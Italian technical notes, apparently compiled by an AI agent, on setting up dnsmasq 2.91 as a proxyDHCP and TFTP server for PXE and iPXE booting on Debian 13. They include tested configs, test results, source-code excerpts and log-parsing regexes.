# Pixio — note tecniche verificate

Consolidamento della ricerca svolta durante lo sviluppo (8 settembre 2026). Ogni voce è stata verificata
sulla macchina reale, sul sorgente dei programmi o sulle ISO scaricate; la colonna *confidenza* è quella
dichiarata da chi ha svolto la verifica. Gli snippet sono copiabili così come sono.

## dnsmasq 2.91 come proxyDHCP + TFTP per PXE/iPXE su Debian 13 (coesistenza con DHCP 10.10.0.1, server 10.10.0.254/ens18)

dnsmasq 2.91-1+deb13u1 e ipxe 1.21.1+git20250501 sono già installati; systemd-resolved NON è installato, il client DHCP è dhcpcd (scrive /etc/resolv.conf), il dnsmasq di sistema gira già su :53 con --local-service e /etc/dnsmasq.conf privo di righe attive. Ho verificato la sintassi sul man 2.91 locale e la logica sul sorgente 2.91 (src/rfc2131.c, option.c, dhcp-common.c da sources.debian.org), poi ho TESTATO DAL VIVO la config in un netns isolato con pacchetti PXE/iPXE artigianali (arch 0/6/7/11, DISCOVER, richieste su 4011, boot-item): tutte le risposte sono corrette. Fatti chiave: (1) in proxy mode dnsmasq risponde SOLO se esiste almeno un pxe-service o pxe-prompt (enable_pxe) e solo ai client con vendor class PXEClient; (2) dhcp-boot È onorato in proxy mode ma solo se nessun pxe-service è applicabile al client; (3) i client UEFI (arch>=6) vengono sempre rediretti su porta 4011 e, con un solo pxe-service per CSA, ricevono siaddr+filename diretti (pxe_uefi_workaround, dal 2.76) — è questo che risolve il "problema noto"; (4) iPXE accetta una risposta proxy solo se siaddr!=0 E filename presente, quindi dhcp-boot per iPXE deve avere l'indirizzo server esplicito (dhcp-boot=tag:ipxe,http://10.10.0.254/boot.ipxe,,10.10.0.254); (5) il loop si evita dando a iPXE (tag da option 175/user-class) l'URL HTTP e NEGANDO il menu PXE con tag:!ipxe (altrimenti iPXE eseguirebbe il menu e ricaricherebbe undionly.kpxe); (6) con log-dhcp le righe "xid vendor class:", "xid user class:", "xid PXE(iface) MAC proxy", "xid tags:", "xid bootfile name:" e dnsmasq-tftp "sent <path> to <IP>" permettono di costruire la lista client; (7) port=0 spegne il DNS e rende irrilevante qualsiasi conflitto sulla 53; con bind-dynamic non ci sono conflitti con dhcpcd. Config finali testate: /tmp/claude-0/-root/a61e104e-c882-489d-9424-4cc40310c811/scratchpad/final/pixio.conf (proxy) e pixio-full.conf (DHCP completo).

### /etc/dnsmasq.d/pixio.conf — proxyDHCP + TFTP (config finale, syntax-check OK, testata live in netns)

*Fonte:* File: /tmp/claude-0/-root/a61e104e-c882-489d-9424-4cc40310c811/scratchpad/final/pixio.conf — verificato con `dnsmasq --test -C /etc/dnsmasq.conf -7 <dir>,.dpkg-dist,.dpkg-old,.dpkg-new --local-service` (rc=0, identico all'invocazione di /usr/share/dnsmasq/systemd-helper) e test live in netns — *confidenza:* alta

```
# /etc/dnsmasq.d/pixio.conf
# Pixio - dnsmasq 2.91 in modalita' proxyDHCP + TFTP (coesiste con il DHCP 10.10.0.1)

# --- Rete / servizi -------------------------------------------------------
port=0                     # disabilita completamente il DNS: restano solo DHCP e TFTP
interface=ens18            # ascolta solo su ens18 (lo aggiunto automaticamente, irrilevante con port=0)
bind-dynamic               # binda gli indirizzi delle singole interfacce, non la wildcard; segue le interfacce che cambiano
# bind-interfaces          # alternativa piu' stretta (non segue cambi di indirizzo)

# --- proxyDHCP -------------------------------------------------------------
# <ip del server>,proxy[,<netmask>]: nessun lease, risponde solo a client con vendor class PXEClient
dhcp-range=10.10.0.254,proxy,255.255.254.0

# --- Architettura client (option 93, RFC 4578) ---
dhcp-match=set:bios,option:client-arch,0        # x86 BIOS
dhcp-match=set:efi32,option:client-arch,6       # EFI IA32
dhcp-match=set:efi64,option:client-arch,7       # EFI x86-64
dhcp-match=set:efi64,option:client-arch,9       # EFI x86-64 alt (BC_EFI)
dhcp-match=set:efiarm64,option:client-arch,11   # EFI ARM64

# --- Riconoscimento iPXE ---
dhcp-match=set:ipxe,175                         # iPXE invia sempre option 175
dhcp-userclass=set:ipxe,iPXE                    # ridondante: iPXE invia anche user-class (77) "iPXE"

# --- Firmware PXE (NON iPXE): un solo pxe-service per CSA -> boot diretto, UEFI via porta 4011 ---
# tag:!ipxe = niente menu PXE a iPXE (altrimenti loop su undionly.kpxe)
pxe-service=tag:!ipxe,x86PC,"Pixio (BIOS)",undionly.kpxe
pxe-service=tag:!ipxe,IA32_EFI,"Pixio (UEFI ia32)",ipxe32.efi
pxe-service=tag:!ipxe,X86-64_EFI,"Pixio (UEFI x64)",ipxe.efi
pxe-service=tag:!ipxe,BC_EFI,"Pixio (UEFI x64)",ipxe.efi
pxe-service=tag:!ipxe,ARM64_EFI,"Pixio (UEFI arm64)",ipxe-arm64.efi
# fallback per ROM BIOS che usano il campo file dell'OFFER (innocuo)
dhcp-boot=tag:bios,tag:!ipxe,undionly.kpxe,,10.10.0.254

# --- iPXE: secondo stadio HTTP. Il 3o campo (server) DEVE essere non-zero: iPXE accetta la
# risposta proxy solo se siaddr!=0 e filename presente (dhcp_has_pxeopts) ---
dhcp-boot=tag:ipxe,http://10.10.0.254/boot.ipxe,,10.10.0.254

# --- TFTP ---
enable-tftp
tftp-root=/srv/pixio/tftp  # file world-readable (dnsmasq gira come utente dnsmasq). NON usare tftp-secure
tftp-no-fail
# tftp-no-blocksize        # solo per ROM rotte

# --- Log ---
log-dhcp
# log-facility=/var/log/pixio/dnsmasq.log   # opzionale (dir deve esistere; file creato da root e chown a dnsmasq)

# --- Opzionali ---
# dhcp-reply-delay=1
# pxe-prompt="Pixio PXE",1   # serve SOLO nella Variante B

# ==== Variante B (stile FOG/LTSP, senza pxe-service) ====
# pxe-prompt="Pixio PXE",1                       # OBBLIGATORIO: abilita il motore PXE in proxy mode
# dhcp-boot=tag:bios,undionly.kpxe,,10.10.0.254
# dhcp-boot=tag:efi32,ipxe32.efi,,10.10.0.254
# dhcp-boot=tag:efi64,ipxe.efi,,10.10.0.254
# dhcp-boot=tag:efiarm64,ipxe-arm64.efi,,10.10.0.254
# dhcp-boot=tag:ipxe,http://10.10.0.254/boot.ipxe,,10.10.0.254
```

### Risultati del test live (netns, dnsmasq 2.91 con la config sopra, client PXE/iPXE emulati)

*Fonte:* Test eseguito con /tmp/claude-0/-root/a61e104e-c882-489d-9424-4cc40310c811/scratchpad/pxetest.py in netns srv/cli (veth), log in .../dnsmasq-test.log e dnsmasq-final.log — *confidenza:* alta

```
DISCOVER arch=0 (BIOS ROM):  OFFER siaddr=10.10.0.254 file=undionly.kpxe  opt43={6:03 (discovery ctrl), 8:servers[32768->10.10.0.254], 9:menu[32768 'Pixio (BIOS)'], 10:prompt}
DISCOVER arch=0 + iPXE:      OFFER siaddr=10.10.0.254 file=http://10.10.0.254/boot.ipxe  opt43={6:08 (usa il filename), 10:prompt}  -> iPXE non vede menu, usa filename
DISCOVER arch=7 (UEFI):      OFFER siaddr=10.10.0.254 file='' opt43={}  -> EDK2 classifica ProxyBinl e manda DHCPREQUEST a 10.10.0.254:4011
REQUEST :4011 arch=7:        ACK  siaddr=10.10.0.254 sname='10.10.0.254' file=ipxe.efi (pxe_uefi_workaround)
DISCOVER arch=7 + iPXE:      OFFER siaddr=10.10.0.254 file=http://10.10.0.254/boot.ipxe  -> iPXE accetta senza round-trip 4011
Boot-item :4011 (opt43/71 type=32768, BIOS dopo menu): ACK file=undionly.kpxe siaddr=10.10.0.254
arch 6 e 11: identici al caso arch 7 con i rispettivi file.
TFTP: curl tftp://10.10.0.254/undionly.kpxe -> 108847 byte; log: dnsmasq-tftp[..]: sent /.../tftp/undionly.kpxe to 10.10.0.37
```

### Sintassi man dnsmasq(8) 2.91 (locale) delle opzioni richieste

*Fonte:* man -P cat dnsmasq (dnsmasq-base 2.91-1+deb13u1, pagina datata 2025-02-05) + /tmp/.../scratchpad/option.c riga 4428 — *confidenza:* alta

```
-F, --dhcp-range=[tag:<tag>[,tag:<tag>],][set:<tag>,]<start-addr>[,<end-addr>|<mode>[,<netmask>[,<broadcast>]]][,<lease time>]
   "For IPv4, the <mode> may be proxy in which case dnsmasq will provide proxy-DHCP on the specified subnet. (See --pxe-prompt and --pxe-service for details.)"
--dhcp-match=set:<tag>,<option number>|option:<option name>|vi-encap:<enterprise>[,<value>]
   "--dhcp-match=set:efi-ia32,option:client-arch,6 sets the tag efi-ia32 if the number 6 appears in the list of architectures sent by the client in option 93."
-j, --dhcp-userclass=set:<tag>,<user-class>   (substring matching)
-U, --dhcp-vendorclass=set:<tag>,[enterprise:<n>,]<vendor-class>   (substring matching)
-M, --dhcp-boot=[tag:<tag>,]<filename>,[<servername>[,<server address>|<tftp_servername>]]
--pxe-service=[tag:<tag>,]<CSA>,<menu text>[,<basename>|<bootservicetype>][,<server address>|<server_name>]
   CSA noti: x86PC, PC98, IA64_EFI, Alpha, Arc_x86, Intel_Lean_Client, IA32_EFI, x86-64_EFI, Xscale_EFI, BC_EFI, ARM32_EFI, ARM64_EFI (indice = valore option 93: x86PC=0, IA32_EFI=6, x86-64_EFI=7, BC_EFI=9, ARM32_EFI=10, ARM64_EFI=11; confronto case-insensitive, src/option.c CSA[])
   "Note that the 'layer' suffix (normally '.0') is supplied by PXE ... Alternatively, the basename may be a filename, complete with suffix, in which case no layer suffix is added."
--pxe-prompt=[tag:<tag>,]<prompt>[,<timeout>]
   "If --pxe-prompt is omitted the system will wait for user input if there are multiple items in the menu, but boot immediately if there is only one."
--enable-tftp[=<interface>[,<interface>]]
--tftp-root=<directory>[,<interface>]   (".." rifiutati; path assoluti ammessi solo dentro la root)
--log-dhcp   "Extra logging for DHCP: log all the options sent to DHCP clients and the tags used to determine them."
-8, --log-facility=<facility>   "If the facility given contains at least one '/' character, it is taken to be a filename ... If the facility is '-' then dnsmasq logs to stderr" (SIGUSR2 riapre il file)
-z, --bind-interfaces / --bind-dynamic   (bind-dynamic: "hybrid ... binds the address of individual interfaces, allowing multiple dnsmasq instances, but if new interfaces or addresses appear, it automatically listens on those")
-i, --interface=<interface name>   ("Dnsmasq automatically adds the loopback (local) interface")
-p, --port=<port>   "Setting this to zero completely disables DNS function, leaving only DHCP and/or TFTP."
--dhcp-option-pxe=[tag:<tag>,...][encap:<opt>,]<opt>,[<value>]   (NUOVA in 2.91: "such options are sent in reply to PXE clients when dnsmasq is acting as a PXE proxy, unlike other options. A typical use-case is option 175, sent to iPXE.")
--dhcp-pxe-vendor=<vendor>[,...]   (vendor class alternativi a PXEClient per firmware custom)
--tag-if=set:<tag>[,set:<tag>[,tag:<tag>[,tag:<tag>]]]   ; prefisso '!' = NOT ("--dhcp-option=tag:!purple,3,1.2.3.4")
```

### Logica proxy-DHCP verificata nel sorgente 2.91 (src/rfc2131.c)

*Fonte:* https://sources.debian.org/data/main/d/dnsmasq/2.91-1%2Bdeb13u1/src/rfc2131.c (righe 863-1040, 2187-2225, 2352-2366), option.c (4311-4356, 4405-4494), dhcp-common.c (option_filter/pxe_ok); man --dhcp-script — *confidenza:* alta

```
1) Il blocco PXE gira solo se: daemon->enable_pxe && is_pxe_client(mess) (vendor class che inizia con "PXEClient" o valori di --dhcp-pxe-vendor). enable_pxe viene messo a 1 SOLO da --pxe-prompt (option.c:4419) o --pxe-service (option.c:4494). Senza almeno uno dei due, in proxy mode dnsmasq NON risponde a nessuno ("if ((context->flags & CONTEXT_PROXY) || pxe) return 0;").
2) Nel ramo proxy (DISCOVER, o REQUEST arrivata su :4011):
   tagif_netid = option_filter(..., 2);   /* solo dhcp-option-pxe: le dhcp-option normali NON vengono inviate in proxy mode */
   boot = find_boot(tagif_netid);
   clear_packet(mess, end);               /* azzera sname, file, opzioni e siaddr */
   if (pxearch >= 6) { redirect4011 = 1; mess->siaddr = tmp->local; }   /* Redirect EFI clients to port 4011 */
   workaround = pxe_uefi_workaround(pxearch, tagif_netid, mess, tmp->local, now, pxe);
   if (!workaround && boot) { if (boot->next_server.s_addr) mess->siaddr = boot->next_server; ... if (boot->file) safe_strncpy(mess->file, boot->file, ...); }   /* Provide the bootfile here, for iPXE, and in case we have no menu items and set discovery_control = 8 */
   ... option 53, 54 (=tmp->local), pxe_misc (opt 60 "PXEClient" + 97 uuid)
   if ((pxe && !workaround) || !redirect4011) do_encap_opts(pxe_opts(...))   /* opt 43: menu/servers/discovery control; ai client UEFI NON viene mandata nell'OFFER */
   log_packet("PXE", NULL, emac, ..., ignore ? "proxy-ignored" : "proxy", ...);
3) pxe_uefi_workaround(): "Only workaround UEFI archs" (pxe_arch < 6 -> return 0). Se esiste ESATTAMENTE UN pxe-service con quel CSA (e tag ok) -> nella risposta su :4011 mette siaddr (server o local), sname = IP in testo, file = basename ("%s" se contiene '.', altrimenti "%s.0"). Se >1 servizi o nessuno -> return 0 (menu classico / dhcp-boot).
4) pxe_opts(): se nessun pxe-service applicabile (i==0) -> discovery_control = 8 ("no menu - just use mess->filename"), altrimenti discovery_control = 3 + PXE_MENU(9) + PXE_SERVERS(8); il prompt e' quello di --pxe-prompt o un finto "PXE" con timeout 255 se >1 voci, 0 se 1 voce.
5) find_boot(): la lista boot_config e' costruita PREPONENDO (option.c: new->next = daemon->boot_config) -> tra piu' dhcp-boot con tag che matchano vince l'ULTIMO nel file; se nessun tag matcha, si prende il primo senza tag.
6) dhcp-boot parsing (option.c:4311): "file,,10.10.0.254" -> sname=NULL (stringa vuota), next_server=10.10.0.254 (inet_pton).
7) In proxy mode NON si creano lease: --dhcp-script NON viene chiamato per i client PXE (solo l'azione "tftp" a fine trasferimento: argomenti = size, IP client, path file).
```

### Perché serve siaddr!=0 per iPXE e come evitare il loop (sorgente iPXE + appnote ufficiale)

*Fonte:* https://raw.githubusercontent.com/ipxe/ipxe/master/src/net/udp/dhcp.c ; src/usr/autoboot.c ; src/core/settings.c ; src/net/dhcppkt.c ; https://ipxe.org/appnote/proxydhcp (export_raw) ; https://ipxe.org/howto/chainloading ; https://ipxe.org/howto/dhcpd — *confidenza:* alta

```
iPXE src/net/udp/dhcp.c:
  static int dhcp_has_pxeopts ( struct dhcp_packet *dhcppkt ) {
      /* Check for a next-server and boot filename */
      if ( dhcppkt->dhcphdr->siaddr.s_addr && ( dhcppkt_fetch ( dhcppkt, DHCP_BOOTFILE_NAME, NULL, 0 ) > 0 ) ) return 1;
      /* Check for a PXE boot menu */
      if ( dhcppkt_fetch ( dhcppkt, DHCP_PXE_BOOT_MENU, NULL, 0 ) > 0 ) return 1;
      return 0; }
  -> l'offerta proxy (opt60 PXEClient, yiaddr 0) viene accettata subito se ha siaddr+filename (il campo 'file' BOOTP vale come option 67: dhcppkt.c dhcp_packet_fields), altrimenti iPXE manda ProxyDHCPREQUEST a <server-id>:4011 e accetta la risposta solo se dhcp_has_pxeopts (dhcp_proxy_rx). Con siaddr=0 la risposta e' ignorata.
  iPXE manda sempre: option 93 (arch), 94, 60 "PXEClient:Arch:xxxxx:UNDI:yyyzzz", 77 user-class "iPXE" (DHCP_USER_CLASS_ID, DHCP_STRING('i','P','X','E')) e option 175 encapsulated.
iPXE src/usr/autoboot.c have_pxe_menu(): usa il menu PXE (-> boot server discovery -> ricarica undionly.kpxe = LOOP) se vendor-class=="PXEClient" && esiste PXE_BOOT_MENU && !(discovery_control & PXEBS_SKIP(8) && filename presente). Quindi a iPXE NON va mandato pxe-service (tag:!ipxe) e va mandato dhcp-boot con URL -> discovery control 8 + filename.
Settings: ${next-server} = siaddr (settings.c: next_server_setting .tag = DHCP_EB_SIADDR), ${filename} = option 67/campo file. fetch_next_server_and_filename() prende filename e next-server DALLO STESSO blocco settings (net0.dhcp o proxydhcp); un siaddr=0 ha lunghezza 0 e non viene considerato (used_len_ipv4).
Appnote ufficiale iPXE (config dnsmasq 2.85 "known working" per proxydhcp):
  dhcp-range=10.1.1.0,proxy
  dhcp-match=set:ipxe-http,175,19 ... tag-if=set:ipxe-ok,...
  pxe-service=tag:!ipxe-ok,X86PC,PXE,undionly.kpxe,10.1.1.2
  pxe-service=tag:!ipxe-ok,IA32_EFI,PXE,snponlyx32.efi,10.1.1.2
  pxe-service=tag:!ipxe-ok,BC_EFI,PXE,snponly.efi,10.1.1.2
  pxe-service=tag:!ipxe-ok,X86-64_EFI,PXE,snponly.efi,10.1.1.2
  # later match overrides previous, keep ipxe script last
  # server address must be non zero, but can be anything as long as iPXE script is not fetched over TFTP
  dhcp-boot=tag:ipxe-ok,http://boot.ipxe.org/demo/boot.php,,0.0.0.1
ipxe.org/howto/chainloading: loop = "PXE will load iPXE which will load iPXE..."; rimedi: autoexec.ipxe su TFTP, script embedded (#!ipxe / dhcp / chain http://...), o DHCP che risponde diversamente al secondo giro. ipxe.org/howto/dhcpd: test ISC `if exists user-class and option user-class = "iPXE"`; "option ipxe.no-pxedhcp 1 ... Do not do this if you are using a ProxyDHCP server; it will cause iPXE to ignore whatever the ProxyDHCP server sends!"
```

### Il 'problema noto' UEFI in proxy mode: cosa succede davvero con dnsmasq >= 2.76/2.80

*Fonte:* /usr/share/doc/dnsmasq-base/changelog.gz ; https://raw.githubusercontent.com/tianocore/edk2/master/NetworkPkg/UefiPxeBcDxe/PxeBcDhcp4.c ; https://forums.fogproject.org/topic/10293/dnsmasq-proxydhcp-bios-and-uefi-coexistence ; https://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2017q1/011347.html — *confidenza:* alta

```
Changelog 2.76 (locale, /usr/share/doc/dnsmasq-base/changelog.gz):
  "Swap the values if BC_EFI and x86-64_EFI in --pxe-service. These were previously wrong due to an error in RFC 4578."
  "Add ARM32_EFI and ARM64_EFI as valid architectures in --pxe-service."
  "Fix PXE booting for UEFI architectures. Modify PXE boot sequence in this case to force the client to talk to dnsmasq over port 4011. This makes PXE and especially proxy-DHCP PXE work with these architectures."
  "Workaround problems with UEFI PXE clients. There exist in the wild PXE clients which have problems with PXE boot menus. To work around this, when there's a single --pxe-service which applies to client, then that target will be booted directly, rather then sending a single-item boot menu."
  "Subtle change in the semantics of basename in --pxe-service ... when <basename> includes a file suffix ... the layer suffix is no longer added."
Changelog 2.91: "Add --dhcp-option-pxe config ... In PXE proxy mode, the set of options sent is defined by the PXE standard and the normal set of options is not sent."
Changelog (2.59 circa): "Don't do any PXE processing, even for clients with the correct vendorclass, unless at least one pxe-prompt or pxe-service option is given."
Comportamento EDK2 (tianocore NetworkPkg/UefiPxeBcDxe/PxeBcDhcp4.c): un'offerta proxy con PXEClient ma senza opt 43 'discover' e' "ProxyBinl" -> PxeBcRetryBinlOffer manda DHCPREQUEST a siaddr (o server-id se siaddr=0) porta 4011 e accetta la risposta se contiene bootfile (opt 67 oppure campo file dell'header: "If the bootfile is not present and bootfilename is present in DHCPv4 packet, just parse it"). Con opt 43 discovery -> "ProxyPxe10" (menu). Entrambi i flussi sono soddisfatti da dnsmasq 2.91: DISCOVER -> siaddr=server, nessun file; :4011 -> file + siaddr (workaround) oppure file da dhcp-boot + opt43 discovery-control=8.
Thread storici: FOG "dnsmasq ProxyDHCP BIOS and UEFI coexistence" (richiede >=2.76; config funzionante con pxe-prompt + dhcp-boot per tag, senza pxe-service, con IP server esplicito nel 3o campo: `dhcp-boot=net:UEFI,ipxe.efi,,192.168.131.149` + `pxe-prompt="Booting FOG Client", 1` + `dhcp-range=192.168.131.149,proxy`); dnsmasq-discuss 2017q1 "About UEFI PXE booting in proxy mode" (2.76 ignorava pacchetti su 4011 in certi setup con pxe-service; workaround: passare a dhcp-boot). Con 2.91 ho verificato che ENTRAMBE le varianti (pxe-service singolo per CSA; oppure pxe-prompt + dhcp-boot) rispondono correttamente su :4011.
```

### Formato log (log-dhcp) da parsare per la lista 'client visti' — righe reali catturate

*Fonte:* Log catturati in /tmp/.../scratchpad/dnsmasq-test.log e dnsmasq-full.log; src/rfc2131.c log_packet/log_options; src/tftp.c righe 521,668,718; src/log.c righe 295-310; journalctl -o json su questa macchina — *confidenza:* alta

```
Identificatori syslog: "dnsmasq", "dnsmasq-dhcp", "dnsmasq-tftp", "dnsmasq-script" (log.c: MS_DHCP -> "-dhcp", MS_TFTP -> "-tftp"). Facility default DAEMON. Con --log-dhcp ogni riga DHCP e' prefissata dallo xid decimale (u32) che lega le righe della stessa transazione.
Proxy mode (client firmware BIOS):
  dnsmasq-dhcp[112812]: 204348144 available DHCP subnet: 10.10.0.254/255.255.254.0
  dnsmasq-dhcp[112812]: 204348144 vendor class: PXEClient:Arch:00000:UNDI:003016
  dnsmasq-dhcp[112812]: 204348144 PXE(vsrv) 52:54:00:aa:bb:00 proxy
  dnsmasq-dhcp[112812]: 204348144 tags: bios, vsrv
  dnsmasq-dhcp[112812]: 204348144 bootfile name: undionly.kpxe
  dnsmasq-dhcp[112812]: 204348144 next server: 10.10.0.254
  dnsmasq-dhcp[112812]: 204348144 broadcast response
  dnsmasq-dhcp[112812]: 204348144 sent size:  1 option: 53 message-type  2   (... una riga per opzione inviata)
Proxy mode (iPXE UEFI):
  dnsmasq-dhcp[112812]: 982758846 vendor class: PXEClient:Arch:00007:UNDI:003016
  dnsmasq-dhcp[112812]: 982758846 user class: iPXE
  dnsmasq-dhcp[112812]: 982758846 PXE(vsrv) 52:54:00:aa:bb:07 proxy
  dnsmasq-dhcp[112812]: 982758846 tags: efi64, ipxe, vsrv
  dnsmasq-dhcp[112812]: 982758846 bootfile name: http://10.10.0.254/boot.ipxe
Richiesta su :4011 (qui il client HA gia' l'IP -> viene loggato):
  dnsmasq-dhcp[112812]: 3402582143 PXE(vsrv) 10.10.0.37 52:54:00:aa:bb:07 ipxe.efi
TFTP (unica riga con IP per i client BIOS/UEFI firmware, emessa a trasferimento completato):
  dnsmasq-tftp[112769]: sent /srv/pixio/tftp/undionly.kpxe to 10.10.0.37
  dnsmasq-tftp[..]: failed sending <path> to <ip> ; error <n> <msg> received from <ip> ; file <path> not found for <ip>
DHCP completo:
  dnsmasq-dhcp[113149]: 3173129068 DHCPDISCOVER(vsrv) 52:54:00:aa:bb:00 
  dnsmasq-dhcp[113149]: 3173129068 tags: bios, vsrv
  dnsmasq-dhcp[113149]: 3173129068 DHCPOFFER(vsrv) 10.10.1.159 52:54:00:aa:bb:00 
  dnsmasq-dhcp[113149]: 3173129068 requested options: 1:netmask, 3:router, 6:dns-server, 43:vendor-encap, 
  (poi DHCPREQUEST/DHCPACK con stesso formato "TIPO(iface) IP MAC [hostname]")
Formato sorgente (log_packet con OPT_LOG_OPTS): "%u %s(%s) %s%s%s %s%s" = xid, tipo, iface, [ip ], mac, stringa("proxy"|"proxy-ignored"|bootfile), err. Senza log-dhcp: "%s(%s) %s%s%s %s%s" (niente xid).
Regex suggerite (Python):
  r'^(?P<xid>\d+) vendor class: (?P<vc>PXEClient:Arch:(?P<arch>\d{5}):UNDI:(?P<undi>\d{6}))'
  r'^(?P<xid>\d+) user class: (?P<uc>.+)$'
  r'^(?P<xid>\d+) PXE\((?P<iface>[^)]+)\) (?:(?P<ip>\d+\.\d+\.\d+\.\d+) )?(?P<mac>(?:[0-9a-f]{2}:){5}[0-9a-f]{2}) (?P<what>proxy|proxy-ignored|\S+)$'
  r'^(?P<xid>\d+) tags: (?P<tags>.+)$'      # es. 'efi64, ipxe, ens18' -> arch da tag bios/efi32/efi64/efiarm64
  r'^(?P<xid>\d+) bootfile name: (?P<file>\S+)$'
  r'^sent (?P<path>\S+) to (?P<ip>\d+\.\d+\.\d+\.\d+)$'   # dnsmasq-tftp
  r'^(?P<xid>\d+) DHCP(?:DISCOVER|OFFER|REQUEST|ACK|NAK)\((?P<iface>[^)]+)\) (?:(?P<ip>\d+\.\d+\.\d+\.\d+) )?(?P<mac>(?:[0-9a-f]{2}:){5}[0-9a-f]{2})'
Lettura: journald e' l'unico sink su questa macchina (rsyslog NON installato, niente /var/log/syslog): `journalctl -u dnsmasq -f -o json` -> campi SYSLOG_IDENTIFIER ("dnsmasq-dhcp"/"dnsmasq-tftp"), MESSAGE, __REALTIME_TIMESTAMP, PRIORITY. In alternativa log-facility=/var/log/pixio/dnsmasq.log (formato "Sep  8 18:24:56 dnsmasq-dhcp[112812]: ...", niente anno) con logrotate `create 0640 dnsmasq adm` + `postrotate kill -USR2`.
IP dei client firmware in proxy mode: NON compare nella riga PXE(...) proxy (yiaddr=0); si ricava da (a) riga PXE su :4011 (UEFI e BIOS con menu), (b) riga dnsmasq-tftp "sent ... to IP", (c) dhcp-script azione "tftp" (argv: size, IP, path), (d) access log nginx per /boot.ipxe (User-Agent iPXE/1.21.1). Correlazione MAC<->IP: tabella ARP/neighbour (`ip neigh`) subito dopo, oppure ${net0/mac} passato da boot.ipxe (es. chain http://10.10.0.254/boot.ipxe?mac=${net0/mac}&arch=${buildarch}&platform=${platform}).
```

### Modalità 'DHCP completo' (/etc/dnsmasq.d/pixio.conf alternativo, syntax-check OK, testato live)

*Fonte:* File: /tmp/claude-0/-root/a61e104e-c882-489d-9424-4cc40310c811/scratchpad/final/pixio-full.conf ; man dnsmasq --dhcp-range/--dhcp-option/--dhcp-authoritative/--no-ping/--dhcp-no-override ; /usr/share/doc/dnsmasq-base/examples/dnsmasq.conf.example righe 457-468 — *confidenza:* alta

```
port=0
interface=ens18
bind-dynamic
dhcp-authoritative                                  # unico DHCP: risponde anche a REQUEST di lease sconosciuti
dhcp-range=10.10.0.100,10.10.1.250,255.255.254.0,12h   # start,end,netmask,lease (min 2m, default 1h; anche 45m/2d/1w/infinite)
dhcp-option=option:router,10.10.0.1                 # opt 3 (default = IP di dnsmasq)
dhcp-option=option:dns-server,10.10.0.1,8.8.8.8     # opt 6 (default = IP di dnsmasq, ma con port=0 NON fa DNS: va impostato!)
# dhcp-option=option:domain-name,lan.local
# dhcp-option=option:ntp-server,10.10.0.1
dhcp-leasefile=/var/lib/misc/dnsmasq.leases         # default Debian
# no-ping                                           # di default dnsmasq pinga l'IP prima dell'OFFER (~3 s di ritardo alla prima offerta, visto nel test)
dhcp-no-override                                    # bootfile/servername restano nei campi BOOTP invece di opt 67/66
dhcp-match=set:bios,option:client-arch,0
dhcp-match=set:efi32,option:client-arch,6
dhcp-match=set:efi64,option:client-arch,7
dhcp-match=set:efi64,option:client-arch,9
dhcp-match=set:efiarm64,option:client-arch,11
dhcp-match=set:ipxe,175
# niente pxe-service/pxe-prompt: bootfile nel DHCPOFFER/ACK normale
dhcp-boot=tag:bios,undionly.kpxe,,10.10.0.254
dhcp-boot=tag:efi32,ipxe32.efi,,10.10.0.254
dhcp-boot=tag:efi64,ipxe.efi,,10.10.0.254
dhcp-boot=tag:efiarm64,ipxe-arm64.efi,,10.10.0.254
dhcp-boot=tag:ipxe,http://10.10.0.254/boot.ipxe,,10.10.0.254   # ultimo = precedenza
dhcp-option=tag:ipxe,encap:175,176,1b               # iPXE no-pxedhcp: non aspetta ProxyDHCP (SOLO qui, mai in proxy mode)
enable-tftp
tftp-root=/srv/pixio/tftp
tftp-no-fail
log-dhcp
# Test live: OFFER arch0 -> yiaddr 10.10.1.159, opt67=undionly.kpxe... ; iPXE -> opt67=http://10.10.0.254/boot.ipxe, siaddr 10.10.0.254 (senza dhcp-no-override il file va in opt 67 e il campo file resta vuoto).
```

### Coesistenza con systemd-resolved / dhcpcd / packaging Debian 13 (stato reale della macchina)

*Fonte:* systemctl/ss/ps su questa macchina; /usr/share/dnsmasq/systemd-helper e init-system-common; /usr/share/doc/dnsmasq-base/README.Debian.gz; /etc/dnsmasq.d/README; man dnsmasq (NOTES su SIGHUP) — *confidenza:* alta

```
Stato verificato: systemd-resolved e NetworkManager NON installati ("not-found"); rete via ifupdown (`iface ens18 inet dhcp`) con dhcpcd (processi dhcpcd attivi, /etc/resolv.conf "Generated by dhcpcd from ens18.dhcp", nameserver 10.10.0.1/8.8.8.8/1.1.1.1). dnsmasq.service e' gia' attivo e ascolta su 0.0.0.0:53/[::]:53 (nessuna config attiva: /etc/dnsmasq.conf tutto commentato, /etc/dnsmasq.d/ contiene solo README). resolvconf NON installato. rsyslog NON installato. AppArmor attivo ma nessun profilo per dnsmasq.
Invocazione reale (systemd-helper): /usr/sbin/dnsmasq -x /run/dnsmasq/dnsmasq.pid -u dnsmasq -7 /etc/dnsmasq.d,.dpkg-dist,.dpkg-old,.dpkg-new --local-service --trust-anchor=... -> TUTTI i file in /etc/dnsmasq.d vengono letti (non solo *.conf), tranne .dpkg-*. ExecStartPre = `dnsmasq --test -7 ... --local-service` (checkconfig). Il processo gira come utente dnsmasq (uid 988, gid nogroup): i file TFTP devono essere world-readable.
port=0: spegne il DNS -> dnsmasq non binda piu' la 53, nessun conflitto possibile con resolved/altri resolver; --local-service e --trust-anchor aggiunti da Debian restano innocui. Nota Debian: start_resolvconf() controlla `grep -qs '^port=0' /etc/dnsmasq.conf` (solo il file principale, non dnsmasq.d) prima di registrare 127.0.0.1 in resolvconf: qui resolvconf non c'e', quindi irrilevante; se un giorno lo si installa, mettere port=0 anche in /etc/dnsmasq.conf o IGNORE_RESOLVCONF=yes in /etc/default/dnsmasq.
dhcpcd: e' un client DHCP (porta 68 via BPF), non confligge con dnsmasq su 67/69/4011; in proxy mode dnsmasq risponde solo ai PXEClient quindi non disturba dhcpcd ne' gli altri host. In modalita' DHCP completo il server deve avere IP statico (dhcpcd/ifupdown non deve piu' dipendere da 10.10.0.1).
bind-dynamic vs bind-interfaces: entrambi evitano il bind wildcard (README.Debian punto 7: bind-interfaces serve per far convivere piu' server DNS/dnsmasq sulla stessa macchina, es. libvirt); bind-dynamic (solo Linux) segue anche indirizzi che cambiano -> preferibile perche' ens18 e' in DHCP.
